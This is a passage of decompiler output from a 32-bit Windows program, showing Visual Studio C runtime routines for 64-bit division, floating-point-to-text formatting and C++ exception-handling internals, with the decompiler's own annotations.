  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __cfltcvt_init
// 
// Library: Visual Studio 2005 Release

void __cfltcvt_init(void)

{
  DAT_00422e38 = __cfltcvt;
  DAT_00422e3c = &LAB_00417e5b;
  _DAT_00422e40 = &LAB_00417e19;
  _DAT_00422e44 = &LAB_00417e4d;
  _DAT_00422e48 = &LAB_00417dc3;
  _DAT_00422e4c = __cfltcvt;
  _DAT_00422e50 = __cfltcvt_l;
  _DAT_00422e54 = __fassign_l;
  _DAT_00422e58 = __cropzeros_l;
  _DAT_00422e5c = __forcdecpt_l;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2005 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  _DAT_004257d4 = __ms_p5_mp_test_fdiv();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



ulonglong __fastcall FUN_00417860(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_004257e4 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
                    // WARNING: Load size is inaccurate
  ExceptionList = *ExceptionList;
                    // WARNING: Could not recover jumptable at 0x00417934. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x00417940. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2005 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x41796b,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  _s_FuncInfo *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x417aa3;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_00422044 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)ExceptionList;
    ExceptionList = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 != 0) {
                    // WARNING: Load size is inaccurate
      *local_2c = *ExceptionList;
    }
    ExceptionList = local_2c;
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x00417b64. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2005 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  TryBlockMapEntry *pTVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  pTVar1 = param_1->pTryBlockMap;
  uVar5 = param_1->nTryBlocks;
  uVar2 = uVar5;
  uVar3 = uVar5;
  while (uVar4 = uVar2, -1 < param_2) {
    if (uVar5 == 0xffffffff) {
      _inconsistency();
    }
    uVar5 = uVar5 - 1;
    if (((pTVar1[uVar5].tryHigh < param_3) && (param_3 <= pTVar1[uVar5].catchHigh)) ||
       (uVar2 = uVar4, uVar5 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar5;
      uVar3 = uVar4;
    }
  }
  uVar5 = uVar5 + 1;
  *param_4 = uVar5;
  *param_5 = uVar3;
  if ((param_1->nTryBlocks < uVar3) || (uVar3 < uVar5)) {
    _inconsistency();
  }
  return pTVar1 + uVar5;
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Library: Visual Studio 2005 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2005 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
    return;
  }
  p_Var2 = __getptd();
  pvVar1 = p_Var2->_pFrameInfoChain;
  do {
    pvVar3 = pvVar1;
    if (*(int *)((int)pvVar3 + 4) == 0) {
      _inconsistency();
      return;
    }
    pvVar1 = *(void **)((int)pvVar3 + 4);
  } while (param_1 != *(void **)((int)pvVar3 + 4));
  *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  void *local_1c;
  undefined *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_00422044 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = &LAB_004179ca;
  local_c = param_1;
  local_1c = ExceptionList;
  ExceptionList = &local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_1c;
  return pvVar1;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2005 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Library: Visual Studio 2005 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2005 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    _memmove(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2005 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  char *_Dst;
  int iVar6;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar6 = 0x16;
  }
  else {
    iVar6 = param_2;
    if (param_2 < 1) {
      iVar6 = 0;
    }
    if (iVar6 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      puVar5 = puVar4;
      if (0 < param_2) {
        puVar5 = puVar4 + 1;
        *puVar4 = *puVar5;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,s_e_000_0041ffe4);
      if (eVar2 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar6 = param_4[1] + -1;
          if (iVar6 < 0) {
            iVar6 = -iVar6;
            _Dst[1] = '-';
          }
          if (99 < iVar6) {
            iVar3 = iVar6 / 100;
            iVar6 = iVar6 % 100;
            _Dst[2] = _Dst[2] + (char)iVar3;
          }
          if (9 < iVar6) {
            iVar3 = iVar6 / 10;
            iVar6 = iVar6 % 10;
            _Dst[3] = _Dst[3] + (char)iVar3;
          }
          _Dst[4] = _Dst[4] + (char)iVar6;
        }
        if (((DAT_004257d8 & 1) != 0) && (_Dst[2] == '0')) {
          _memmove(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    piVar1 = __errno();
    iVar6 = 0x22;
  }
  *piVar1 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar6;
}



// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2005 Release

void __cdecl
__cftoe_l(double *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2005 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_004180fb:
    *piVar2 = iVar15;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_004180fb;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar3;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar3;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_0041841f;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = ***(char ***)(local_28[0] + 0xbc);
  }
  if (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_004183ce:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_004183d9;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_004183ce;
LAB_004183d9:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_0041841f:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2005 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  undefined *puVar3;
  undefined4 uVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      puVar3 = (undefined *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this);
      *puVar3 = 0x30;
      puVar3[1] = 0;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      __shift();
      *(undefined *)this = 0x30;
      puVar3 = (undefined *)((int)this + 1);
    }
    else {
      puVar3 = (undefined *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      __shift();
      *puVar3 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(puVar3 + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2005 Release

void __cdecl
__cftof_l(double *param_1,undefined *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == -1) {
      _SizeInBytes = 0xffffffff;
    }
